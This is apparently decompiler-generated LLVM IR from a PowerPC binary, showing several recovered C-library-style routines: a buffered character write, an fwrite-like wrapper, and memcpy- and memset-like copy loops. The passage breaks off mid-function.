define i32 @function_10006ed0(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006ed0:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp7 = sext i8 %arg1 to i32
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp7, i32* @r30, align 4
  %v2_10006ee8 = add i32 %arg2, 16
  %v3_10006ee8 = inttoptr i32 %v2_10006ee8 to i32*
  %v4_10006ee8 = load i32, i32* %v3_10006ee8, align 4
  store i32 %v4_10006ee8, i32* %r11.global-to-local, align 4
  %v2_10006eec = add i32 %arg2, 28
  %v3_10006eec = inttoptr i32 %v2_10006eec to i32*
  %v4_10006eec = load i32, i32* %v3_10006eec, align 4
  %v2_10006ef0 = icmp ult i32 %v4_10006ee8, %v4_10006eec
  br i1 %v2_10006ef0, label %dec_label_pc_10006ef8, label %dec_label_pc_10006f0c

dec_label_pc_10006ef8:                            ; preds = %dec_label_pc_10006ed0
  %v1_10006ef81 = zext i8 %arg1 to i32
  %v1_10006efc = add i32 %v4_10006ee8, 1
  store i32 %v1_10006efc, i32* %r9.global-to-local, align 4
  store i32 %v1_10006ef81, i32* %r3.global-to-local, align 4
  %v3_10006f04 = inttoptr i32 %v4_10006ee8 to i8*
  store i8 %arg1, i8* %v3_10006f04, align 1
  %v0_10006fb0.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10006fb0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006fb0

dec_label_pc_10006f0c:                            ; preds = %dec_label_pc_10006ed0
  %v3_10006f0c = load i16, i16* %tmp, align 2
  %v4_10006f0c = zext i16 %v3_10006f0c to i32
  %v1_10006f10 = call i32 @__asm_rlwinm(i32 %v4_10006f0c, i32 0, i32 24, i32 25)
  %v3_10006f14 = icmp eq i32 %v1_10006f10, 192
  br i1 %v3_10006f14, label %dec_label_pc_10006f30, label %dec_label_pc_10006f1c

dec_label_pc_10006f1c:                            ; preds = %dec_label_pc_10006f0c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 128, i32* @r4, align 4
  store i32 268463912, i32* @lr, align 4
  %v3_10006f24 = call i32 @function_10009eb8(i16* nonnull %tmp)
  store i32 %v3_10006f24, i32* %r3.global-to-local, align 4
  %v3_10006f28 = icmp eq i32 %v3_10006f24, 0
  br i1 %v3_10006f28, label %dec_label_pc_10006f30, label %dec_label_pc_10006fdc

dec_label_pc_10006f30:                            ; preds = %dec_label_pc_10006f1c, %dec_label_pc_10006f0c
  %v0_10006f30 = load i32, i32* @r31, align 4
  %v1_10006f30 = add i32 %v0_10006f30, 4
  %v2_10006f30 = inttoptr i32 %v1_10006f30 to i32*
  %v3_10006f30 = load i32, i32* %v2_10006f30, align 4
  %v0_10006f34 = load i32, i32* @r30, align 4
  %v1_10006f34 = urem i32 %v0_10006f34, 256
  store i32 %v1_10006f34, i32* %r3.global-to-local, align 4
  %v3_10006f38 = icmp eq i32 %v3_10006f30, -2
  br i1 %v3_10006f38, label %dec_label_pc_10006fe0, label %dec_label_pc_10006f40

dec_label_pc_10006f40:                            ; preds = %dec_label_pc_10006f30
  %v1_10006f40 = add i32 %v0_10006f30, 12
  %v2_10006f40 = inttoptr i32 %v1_10006f40 to i32*
  %v3_10006f40 = load i32, i32* %v2_10006f40, align 4
  store i32 %v3_10006f40, i32* %r9.global-to-local, align 4
  %v1_10006f44 = add i32 %v0_10006f30, 8
  %v2_10006f44 = inttoptr i32 %v1_10006f44 to i32*
  %v3_10006f44 = load i32, i32* %v2_10006f44, align 4
  %v4_10006f48 = icmp eq i32 %v3_10006f40, %v3_10006f44
  br i1 %v4_10006f48, label %dec_label_pc_10006fb8, label %dec_label_pc_10006f50

dec_label_pc_10006f50:                            ; preds = %dec_label_pc_10006f40
  %v1_10006f50 = add i32 %v0_10006f30, 16
  %v2_10006f50 = inttoptr i32 %v1_10006f50 to i32*
  %v3_10006f50 = load i32, i32* %v2_10006f50, align 4
  %v4_10006f54 = icmp eq i32 %v3_10006f40, %v3_10006f50
  br i1 %v4_10006f54, label %dec_label_pc_10006f5c, label %dec_label_pc_10006f6c

dec_label_pc_10006f5c:                            ; preds = %dec_label_pc_10006f50
  store i32 %v0_10006f30, i32* @r3, align 4
  store i32 268463972, i32* @lr, align 4
  %v0_10006f60 = call i32 @function_10005834()
  store i32 %v0_10006f60, i32* %r3.global-to-local, align 4
  %v3_10006f64 = icmp eq i32 %v0_10006f60, 0
  br i1 %v3_10006f64, label %dec_label_pc_10006f5c.dec_label_pc_10006f6c_crit_edge, label %dec_label_pc_10006fdc

dec_label_pc_10006f5c.dec_label_pc_10006f6c_crit_edge: ; preds = %dec_label_pc_10006f5c
  %v0_10006f6c.pre = load i32, i32* @r31, align 4
  %v0_10006f70.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006f6c

dec_label_pc_10006f6c:                            ; preds = %dec_label_pc_10006f5c.dec_label_pc_10006f6c_crit_edge, %dec_label_pc_10006f50
  %v0_10006f70 = phi i32 [ %v0_10006f70.pre, %dec_label_pc_10006f5c.dec_label_pc_10006f6c_crit_edge ], [ %v0_10006f34, %dec_label_pc_10006f50 ]
  %v0_10006f6c = phi i32 [ %v0_10006f6c.pre, %dec_label_pc_10006f5c.dec_label_pc_10006f6c_crit_edge ], [ %v0_10006f30, %dec_label_pc_10006f50 ]
  %v1_10006f6c = add i32 %v0_10006f6c, 16
  %v2_10006f6c = inttoptr i32 %v1_10006f6c to i32*
  %v3_10006f6c = load i32, i32* %v2_10006f6c, align 4
  store i32 %v3_10006f6c, i32* %r9.global-to-local, align 4
  %v1_10006f70 = urem i32 %v0_10006f70, 256
  store i32 %v1_10006f70, i32* %r11.global-to-local, align 4
  %v1_10006f74 = trunc i32 %v0_10006f70 to i8
  %v3_10006f74 = inttoptr i32 %v3_10006f6c to i8*
  store i8 %v1_10006f74, i8* %v3_10006f74, align 1
  %v0_10006f78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006f78 = add i32 %v0_10006f78, 1
  store i32 %v1_10006f78, i32* %r9.global-to-local, align 4
  %v1_10006f7c = load i32, i32* @r31, align 4
  %v2_10006f7c = add i32 %v1_10006f7c, 16
  %v3_10006f7c = inttoptr i32 %v2_10006f7c to i32*
  store i32 %v1_10006f78, i32* %v3_10006f7c, align 4
  %v0_10006f80 = load i32, i32* @r31, align 4
  %v1_10006f80 = inttoptr i32 %v0_10006f80 to i16*
  %v2_10006f80 = load i16, i16* %v1_10006f80, align 2
  %v3_10006f80 = zext i16 %v2_10006f80 to i32
  %v1_10006f84 = and i32 %v3_10006f80, 256
  store i32 %v1_10006f84, i32* %r9.global-to-local, align 4
  %v3_10006f84 = icmp eq i32 %v1_10006f84, 0
  br i1 %v3_10006f84, label %dec_label_pc_10006fd4, label %dec_label_pc_10006f8c

dec_label_pc_10006f8c:                            ; preds = %dec_label_pc_10006f6c
  %v0_10006f8c = load i32, i32* %r11.global-to-local, align 4
  %v3_10006f8c = icmp eq i32 %v0_10006f8c, 10
  br i1 %v3_10006f8c, label %dec_label_pc_10006f94, label %dec_label_pc_10006fd4

dec_label_pc_10006f94:                            ; preds = %dec_label_pc_10006f8c
  store i32 %v0_10006f80, i32* @r3, align 4
  store i32 268464028, i32* @lr, align 4
  %v0_10006f98 = call i32 @function_10005834()
  store i32 %v0_10006f98, i32* %r3.global-to-local, align 4
  %v3_10006f9c = icmp eq i32 %v0_10006f98, 0
  br i1 %v3_10006f9c, label %dec_label_pc_10006fd4, label %dec_label_pc_10006fa4

dec_label_pc_10006fa4:                            ; preds = %dec_label_pc_10006f94
  %v0_10006fa4 = load i32, i32* @r31, align 4
  %v1_10006fa4 = add i32 %v0_10006fa4, 16
  %v2_10006fa4 = inttoptr i32 %v1_10006fa4 to i32*
  %v3_10006fa4 = load i32, i32* %v2_10006fa4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10006fac = add i32 %v3_10006fa4, -1
  store i32 %v1_10006fac, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006fb0

dec_label_pc_10006fb0:                            ; preds = %dec_label_pc_10006ef8, %dec_label_pc_10006fa4
  %v1_10006fb0 = phi i32 [ %v1_10006fb0.pre, %dec_label_pc_10006ef8 ], [ %v0_10006fa4, %dec_label_pc_10006fa4 ]
  %v0_10006fb0 = phi i32 [ %v0_10006fb0.pre, %dec_label_pc_10006ef8 ], [ %v1_10006fac, %dec_label_pc_10006fa4 ]
  %v2_10006fb0 = add i32 %v1_10006fb0, 16
  %v3_10006fb0 = inttoptr i32 %v2_10006fb0 to i32*
  store i32 %v0_10006fb0, i32* %v3_10006fb0, align 4
  %v0_10006ff0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006fe0

dec_label_pc_10006fb8:                            ; preds = %dec_label_pc_10006f40
  %v1_10006fb8 = inttoptr i32 %v0_10006f30 to i16*
  store i32 %v0_10006f30, i32* %r3.global-to-local, align 4
  %v2_10006fbc = ptrtoint i8* %stack_var_-24 to i32
  store i32 1, i32* @r5, align 4
  %v6_10006fc4 = trunc i32 %v0_10006f34 to i8
  store i8 %v6_10006fc4, i8* %stack_var_-24, align 1
  store i32 268464076, i32* @lr, align 4
  %v5_10006fc8 = call i32 @function_10009c6c(i16* %v1_10006fb8, i32 %v2_10006fbc)
  store i32 %v5_10006fc8, i32* %r3.global-to-local, align 4
  %v3_10006fcc = icmp eq i32 %v5_10006fc8, 0
  br i1 %v3_10006fcc, label %dec_label_pc_10006fdc, label %dec_label_pc_10006fd4

dec_label_pc_10006fd4:                            ; preds = %dec_label_pc_10006f8c, %dec_label_pc_10006fb8, %dec_label_pc_10006f94, %dec_label_pc_10006f6c
  %v0_10006fd4 = load i32, i32* @r30, align 4
  %v1_10006fd4 = urem i32 %v0_10006fd4, 256
  store i32 %v1_10006fd4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006fe0

dec_label_pc_10006fdc:                            ; preds = %dec_label_pc_10006f5c, %dec_label_pc_10006f1c, %dec_label_pc_10006fb8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006fe0

dec_label_pc_10006fe0:                            ; preds = %dec_label_pc_10006f30, %dec_label_pc_10006fd4, %dec_label_pc_10006fb0, %dec_label_pc_10006fdc
  %v0_10006ff0 = phi i32 [ %v1_10006f34, %dec_label_pc_10006f30 ], [ %v1_10006fd4, %dec_label_pc_10006fd4 ], [ %v0_10006ff0.pre, %dec_label_pc_10006fb0 ], [ -1, %dec_label_pc_10006fdc ]
  ret i32 %v0_10006ff0

; uselistorder directives
  uselistorder i32 %v1_10006fd4, { 1, 0 }
  uselistorder i32 %v0_10006f70, { 1, 0 }
  uselistorder i32 %v1_10006f34, { 1, 0 }
  uselistorder i32 %v0_10006f34, { 1, 2, 0 }
  uselistorder i32 %v0_10006f30, { 2, 3, 0, 1, 4, 6, 5, 7 }
  uselistorder i32 %v4_10006ee8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006fe0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10006fdc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006fd4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10006fb0, { 1, 0 }
}

define i32 @function_10006ff4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006ff4:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000700c = call i32 @function_10007288()
  store i32 %v0_1000700c, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10007028.253 to i32), i32* @lr, align 4
  %v4_10007024 = inttoptr i32 %arg2 to i16*
  %v5_10007024 = call i32 @function_10007050(i32 %arg1, i32 1, i32 %v0_1000700c, i16* %v4_10007024)
  %v1_1000702c = load i32, i32* @r27, align 4
  %v4_1000702c = icmp eq i32 %v5_10007024, %v1_1000702c
  br i1 %v4_1000702c, label %dec_label_pc_10007034, label %dec_label_pc_10007038

dec_label_pc_10007034:                            ; preds = %dec_label_pc_10006ff4
  br label %dec_label_pc_10007038

dec_label_pc_10007038:                            ; preds = %dec_label_pc_10006ff4, %dec_label_pc_10007034
  %v0_10007038 = phi i32 [ -1, %dec_label_pc_10006ff4 ], [ %v5_10007024, %dec_label_pc_10007034 ]
  ret i32 %v0_10007038

; uselistorder directives
  uselistorder label %dec_label_pc_10007038, { 1, 0 }
}

define i32 @function_10007050(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_10007050:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_10007068 = load i16, i16* %arg4, align 2
  %v4_10007068 = zext i16 %v3_10007068 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_10007078 = call i32 @__asm_rlwinm(i32 %v4_10007068, i32 0, i32 24, i32 25)
  %v3_10007080 = icmp eq i32 %v1_10007078, 192
  br i1 %v3_10007080, label %dec_label_pc_10007094, label %dec_label_pc_10007088

dec_label_pc_10007088:                            ; preds = %dec_label_pc_10007050
  store i32 268464268, i32* @lr, align 4
  %v3_10007088 = call i32 @function_10009eb8(i16* nonnull %arg4)
  %v3_1000708c = icmp eq i32 %v3_10007088, 0
  br i1 %v3_1000708c, label %dec_label_pc_10007094, label %dec_label_pc_100070ec

dec_label_pc_10007094:                            ; preds = %dec_label_pc_10007088, %dec_label_pc_10007050
  %v0_10007094 = load i32, i32* @r29, align 4
  %v3_10007094 = icmp eq i32 %v0_10007094, 0
  %v0_10007098 = load i32, i32* @r30, align 4
  %v3_10007098 = icmp eq i32 %v0_10007098, 0
  %brmerge = or i1 %v3_10007094, %v3_10007098
  br i1 %brmerge, label %dec_label_pc_100070ec, label %dec_label_pc_100070a4

dec_label_pc_100070a4:                            ; preds = %dec_label_pc_10007094
  %v2_100070ac = udiv i32 -1, %v0_10007094
  %v0_100070b0 = load i32, i32* @r31, align 4
  %v3_100070b4 = icmp ugt i32 %v0_10007098, %v2_100070ac
  %v1_100070cc = inttoptr i32 %v0_100070b0 to i16*
  br i1 %v3_100070b4, label %dec_label_pc_100070cc, label %dec_label_pc_100070bc

dec_label_pc_100070bc:                            ; preds = %dec_label_pc_100070a4
  %v0_100070a8 = load i32, i32* @r28, align 4
  %v2_100070bc = mul i32 %v0_10007098, %v0_10007094
  store i32 %v2_100070bc, i32* %r4.global-to-local, align 4
  store i32 268464324, i32* @lr, align 4
  %v5_100070c0 = call i32 @function_10009d4c(i32 %v0_100070a8, i32 %v2_100070bc, i16* %v1_100070cc)
  %v1_100070c4 = load i32, i32* @r29, align 4
  %v2_100070c4 = udiv i32 %v5_100070c0, %v1_100070c4
  store i32 %v2_100070c4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100070f0

dec_label_pc_100070cc:                            ; preds = %dec_label_pc_100070a4
  %v2_100070cc = load i16, i16* %v1_100070cc, align 2
  %v1_100070d0 = or i16 %v2_100070cc, 8
  store i16 %v1_100070d0, i16* %v1_100070cc, align 2
  %v0_100070d8 = call i32 @function_10004e38()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_100070e4 = inttoptr i32 %v0_100070d8 to i32*
  store i32 22, i32* %v2_100070e4, align 4
  %v0_100070f4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100070f0

dec_label_pc_100070ec:                            ; preds = %dec_label_pc_10007094, %dec_label_pc_10007088
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100070f0

dec_label_pc_100070f0:                            ; preds = %dec_label_pc_100070cc, %dec_label_pc_100070bc, %dec_label_pc_100070ec
  %v0_100070f4 = phi i32 [ %v0_100070f4.pre, %dec_label_pc_100070cc ], [ %v2_100070c4, %dec_label_pc_100070bc ], [ 0, %dec_label_pc_100070ec ]
  ret i32 %v0_100070f4

; uselistorder directives
  uselistorder i16* %v1_100070cc, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_10009d4c, { 6, 1, 2, 4, 5, 0, 3 }
  uselistorder i32 (i16*)* @function_10009eb8, { 1, 0 }
  uselistorder label %dec_label_pc_100070f0, { 2, 0, 1 }
}

define i32 @function_10007108() local_unnamed_addr {
dec_label_pc_10007108:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10007108 = load i32, i32* @r5, align 4
  %v1_10007108 = call i32 @__asm_rlwinm.(i32 %v0_10007108, i32 29, i32 3, i32 31)
  store i32 %v1_10007108, i32* %r9.global-to-local, align 4
  %v4_10007108 = icmp eq i32 %v1_10007108, 0
  %v0_1000710c = load i32, i32* @r4, align 4
  %v1_1000710c = add i32 %v0_1000710c, -4
  store i32 %v1_1000710c, i32* %r4.global-to-local, align 4
  %v0_10007110 = load i32, i32* @r3, align 4
  %v1_10007110 = add i32 %v0_10007110, -4
  store i32 %v1_10007110, i32* @r11, align 4
  br i1 %v4_10007108, label %dec_label_pc_10007138, label %dec_label_pc_10007118

dec_label_pc_10007118:                            ; preds = %dec_label_pc_10007108
  %v1_10007118 = urem i32 %v1_10007110, 4
  %v3_10007118 = icmp eq i32 %v1_10007118, 0
  br i1 %v3_10007118, label %dec_label_pc_10007120, label %dec_label_pc_10007174

dec_label_pc_10007120:                            ; preds = %dec_label_pc_10007194.dec_label_pc_10007120_crit_edge, %dec_label_pc_10007118
  %v1_1000712c.pre = phi i32 [ %v1_10007110, %dec_label_pc_10007118 ], [ %v1_1000712c.pre.pre, %dec_label_pc_10007194.dec_label_pc_10007120_crit_edge ]
  %v0_10007120 = phi i32 [ %v1_10007108, %dec_label_pc_10007118 ], [ %v1_10007194, %dec_label_pc_10007194.dec_label_pc_10007120_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10007118 ], [ %v2_1000717c, %dec_label_pc_10007194.dec_label_pc_10007120_crit_edge ]
  store i32 %v0_10007120, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007124

dec_label_pc_10007124:                            ; preds = %dec_label_pc_10007124, %dec_label_pc_10007120
  %v1_1000712c = phi i32 [ %v2_10007130, %dec_label_pc_10007124 ], [ %v1_1000712c.pre, %dec_label_pc_10007120 ]
  %v0_10007124 = load i32, i32* %r4.global-to-local, align 4
  %v1_10007124 = add i32 %v0_10007124, 4
  %v2_10007124 = inttoptr i32 %v1_10007124 to i32*
  %v3_10007124 = load i32, i32* %v2_10007124, align 4
  %v1_10007128 = add i32 %v0_10007124, 8
  %v2_10007128 = inttoptr i32 %v1_10007128 to i32*
  %v3_10007128 = load i32, i32* %v2_10007128, align 4
  store i32 %v3_10007128, i32* %r9.global-to-local, align 4
  store i32 %v1_10007128, i32* %r4.global-to-local, align 4
  %v2_1000712c = add i32 %v1_1000712c, 4
  %v3_1000712c = inttoptr i32 %v2_1000712c to i32*
  store i32 %v3_10007124, i32* %v3_1000712c, align 4
  %v0_10007130 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007130 = load i32, i32* @r11, align 4
  %v2_10007130 = add i32 %v1_10007130, 8
  %v3_10007130 = inttoptr i32 %v2_10007130 to i32*
  store i32 %v0_10007130, i32* %v3_10007130, align 4
  store i32 %v2_10007130, i32* @r11, align 4
  %v0_10007134 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007134 = add i32 %v0_10007134, -1
  store i32 %v1_10007134, i32* %ctr.global-to-local, align 4
  %v2_10007134 = icmp eq i32 %v1_10007134, 0
  br i1 %v2_10007134, label %dec_label_pc_10007138, label %dec_label_pc_10007124

dec_label_pc_10007138:                            ; preds = %dec_label_pc_10007124, %dec_label_pc_10007194, %dec_label_pc_10007108
  %.1 = phi i32 [ undef, %dec_label_pc_10007108 ], [ %v2_1000717c, %dec_label_pc_10007194 ], [ %.0, %dec_label_pc_10007124 ]
  %v1_10007138 = urem i32 %.1, 8
  store i32 %v1_10007138, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10007138, 4
  br i1 %tmp, label %dec_label_pc_10007150, label %dec_label_pc_10007144

dec_label_pc_10007144:                            ; preds = %dec_label_pc_10007138
  %v0_10007144 = load i32, i32* %r4.global-to-local, align 4
  %v1_10007144 = add i32 %v0_10007144, 4
  %v2_10007144 = inttoptr i32 %v1_10007144 to i32*
  %v3_10007144 = load i32, i32* %v2_10007144, align 4
  store i32 %v1_10007144, i32* %r4.global-to-local, align 4
  %v1_10007148 = add nsw i32 %v1_10007138, -4
  store i32 %v1_10007148, i32* @r5, align 4
  %v1_1000714c = load i32, i32* @r11, align 4
  %v2_1000714c = add i32 %v1_1000714c, 4
  %v3_1000714c = inttoptr i32 %v2_1000714c to i32*
  store i32 %v3_10007144, i32* %v3_1000714c, align 4
  store i32 %v2_1000714c, i32* @r11, align 4
  %v0_10007150.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10007150

dec_label_pc_10007150:                            ; preds = %dec_label_pc_10007138, %dec_label_pc_10007144
  %v0_10007150 = phi i32 [ %v1_10007138, %dec_label_pc_10007138 ], [ %v0_10007150.pre, %dec_label_pc_10007144 ]
  %v3_10007150 = icmp eq i32 %v0_10007150, 0
  %v0_10007154 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007150, i32 %v0_10007154)
  %v0_10007158 = load i32, i32* @r5, align 4
  store i32 %v0_10007158, i32* %ctr.global-to-local, align 4
  %v0_1000715c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000715c = add i32 %v0_1000715c, 3
  store i32 %v1_1000715c, i32* %r4.global-to-local, align 4
  %v0_10007160 = load i32, i32* @r11, align 4
  %v1_10007160 = add i32 %v0_10007160, 3
  store i32 %v1_10007160, i32* %r9.global-to-local, align 4
  %v1_100071649 = add i32 %v0_1000715c, 4
  %v2_1000716410 = inttoptr i32 %v1_100071649 to i8*
  %v3_1000716411 = load i8, i8* %v2_1000716410, align 1
  store i32 %v1_100071649, i32* %r4.global-to-local, align 4
  %v3_1000716813 = add i32 %v0_10007160, 4
  %v4_1000716814 = inttoptr i32 %v3_1000716813 to i8*
  store i8 %v3_1000716411, i8* %v4_1000716814, align 1
  store i32 %v3_1000716813, i32* %r9.global-to-local, align 4
  %v0_1000716c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000716c16 = add i32 %v0_1000716c15, -1
  store i32 %v1_1000716c16, i32* %ctr.global-to-local, align 4
  %v2_1000716c17 = icmp eq i32 %v1_1000716c16, 0
  br i1 %v2_1000716c17, label %dec_label_pc_100071a0, label %dec_label_pc_10007164.dec_label_pc_10007164_crit_edge

dec_label_pc_10007164.dec_label_pc_10007164_crit_edge: ; preds = %dec_label_pc_10007150, %dec_label_pc_10007164.dec_label_pc_10007164_crit_edge
  %v3_1000716818 = phi i32 [ %v3_10007168, %dec_label_pc_10007164.dec_label_pc_10007164_crit_edge ], [ %v3_1000716813, %dec_label_pc_10007150 ]
  %v0_10007164.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10007164 = add i32 %v0_10007164.pre, 1
  %v2_10007164 = inttoptr i32 %v1_10007164 to i8*
  %v3_10007164 = load i8, i8* %v2_10007164, align 1
  store i32 %v1_10007164, i32* %r4.global-to-local, align 4
  %v3_10007168 = add i32 %v3_1000716818, 1
  %v4_10007168 = inttoptr i32 %v3_10007168 to i8*
  store i8 %v3_10007164, i8* %v4_10007168, align 1
  store i32 %v3_10007168, i32* %r9.global-to-local, align 4
  %v0_1000716c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000716c = add i32 %v0_1000716c, -1
  store i32 %v1_1000716c, i32* %ctr.global-to-local, align 4
  %v2_1000716c = icmp eq i32 %v1_1000716c, 0
  br i1 %v2_1000716c, label %dec_label_pc_100071a0, label %dec_label_pc_10007164.dec_label_pc_10007164_crit_edge

dec_label_pc_10007174:                            ; preds = %dec_label_pc_10007118
  %v1_10007174 = sub nsw i32 4, %v1_10007118
  store i32 %v1_10007174, i32* %ctr.global-to-local, align 4
  %v1_1000717c = load i32, i32* @r5, align 4
  %v2_1000717c = sub i32 %v1_1000717c, %v1_10007174
  br label %dec_label_pc_10007180

dec_label_pc_10007180:                            ; preds = %dec_label_pc_10007180.dec_label_pc_10007180_crit_edge, %dec_label_pc_10007174
  %v2_10007188 = phi i32 [ %v1_1000718c, %dec_label_pc_10007180.dec_label_pc_10007180_crit_edge ], [ %v1_10007110, %dec_label_pc_10007174 ]
  %v0_10007180 = phi i32 [ %v0_10007180.pre, %dec_label_pc_10007180.dec_label_pc_10007180_crit_edge ], [ %v1_1000710c, %dec_label_pc_10007174 ]
  %v1_10007180 = add i32 %v0_10007180, 4
  %v2_10007180 = inttoptr i32 %v1_10007180 to i8*
  %v3_10007180 = load i8, i8* %v2_10007180, align 1
  %v1_10007184 = add i32 %v0_10007180, 1
  store i32 %v1_10007184, i32* %r4.global-to-local, align 4
  %v3_10007188 = add i32 %v2_10007188, 4
  %v4_10007188 = inttoptr i32 %v3_10007188 to i8*
  store i8 %v3_10007180, i8* %v4_10007188, align 1
  %v0_1000718c = load i32, i32* @r11, align 4
  %v1_1000718c = add i32 %v0_1000718c, 1
  store i32 %v1_1000718c, i32* @r11, align 4
  %v0_10007190 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007190 = add i32 %v0_10007190, -1
  store i32 %v1_10007190, i32* %ctr.global-to-local, align 4
  %v2_10007190 = icmp eq i32 %v1_10007190, 0
  br i1 %v2_10007190, label %dec_label_pc_10007194, label %dec_label_pc_10007180.dec_label_pc_10007180_crit_edge

dec_label_pc_10007180.dec_label_pc_10007180_crit_edge: ; preds = %dec_label_pc_10007180
  %v0_10007180.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007180

dec_label_pc_10007194:                            ; preds = %dec_label_pc_10007180
  %v1_10007194 = call i32 @__asm_rlwinm.(i32 %v2_1000717c, i32 29, i32 3, i32 31)
  store i32 %v1_10007194, i32* %r9.global-to-local, align 4
  %v4_10007194 = icmp eq i32 %v1_10007194, 0
  br i1 %v4_10007194, label %dec_label_pc_10007138, label %dec_label_pc_10007194.dec_label_pc_10007120_crit_edge

dec_label_pc_10007194.dec_label_pc_10007120_crit_edge: ; preds = %dec_label_pc_10007194
  %v1_1000712c.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10007120

dec_label_pc_100071a0:                            ; preds = %dec_label_pc_10007164.dec_label_pc_10007164_crit_edge, %dec_label_pc_10007150
  %v0_100071a0 = load i32, i32* @r3, align 4
  ret i32 %v0_100071a0

; uselistorder directives
  uselistorder i32 %v1_10007194, { 1, 2, 0 }
  uselistorder i32 %v1_10007190, { 1, 0 }
  uselistorder i32 %v1_1000718c, { 1, 0 }
  uselistorder i32 %v0_10007180, { 1, 0 }
  uselistorder i32 %v2_1000717c, { 2, 1, 0 }
  uselistorder i32 %v1_1000716c, { 1, 0 }
  uselistorder i32 %v3_10007168, { 1, 2, 0 }
  uselistorder i32 %v1_10007138, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10007134, { 1, 0 }
  uselistorder i32 %v2_10007130, { 1, 2, 0 }
  uselistorder i32 %v1_10007118, { 1, 0 }
  uselistorder i32 %v1_10007110, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10007164.dec_label_pc_10007164_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10007150, { 1, 0 }
  uselistorder label %dec_label_pc_10007138, { 1, 0, 2 }
}

define i32 @function_100071a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100071a4:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_100071a4 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_100071a4, i32* %r9.global-to-local, align 4
  %v4_100071a4 = icmp eq i32 %v1_100071a4, 0
  %v1_100071ac = add i32 %arg1, -4
  store i32 %v1_100071ac, i32* %r11.global-to-local, align 4
  %v1_100071b0 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_100071b4 = call i32 @__asm_rlwimi(i32 %v1_100071b0, i32 16, i32 0, i32 15)
  %v2_100071b4 = trunc i32 %v1_100071b4 to i8
  br i1 %v4_100071a4, label %dec_label_pc_100071dc, label %dec_label_pc_100071bc

dec_label_pc_100071bc:                            ; preds = %dec_label_pc_100071a4
  %v0_100071bc = load i32, i32* %r11.global-to-local, align 4
  %v1_100071bc = urem i32 %v0_100071bc, 4
  %v3_100071bc = icmp eq i32 %v1_100071bc, 0
